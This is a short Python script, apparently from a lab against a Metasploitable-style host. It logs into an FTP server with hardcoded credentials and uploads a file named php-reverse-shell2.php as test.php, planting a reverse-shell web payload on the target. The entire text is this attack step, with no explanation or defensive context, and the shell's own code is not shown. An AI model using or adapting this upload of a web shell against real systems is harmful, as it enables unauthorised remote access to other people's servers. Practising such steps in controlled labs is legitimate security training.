import ftplib
ftp = ftplib.FTP("192.168.0.25")
ftp.login("msfadmin", "blablabla")
localfile='/home/user/php-reverse-shell2.php'
remotefile='test.php'
with open(localfile, "rb") as file:
    ftp.storbinary('STOR %s' % remotefile, file)
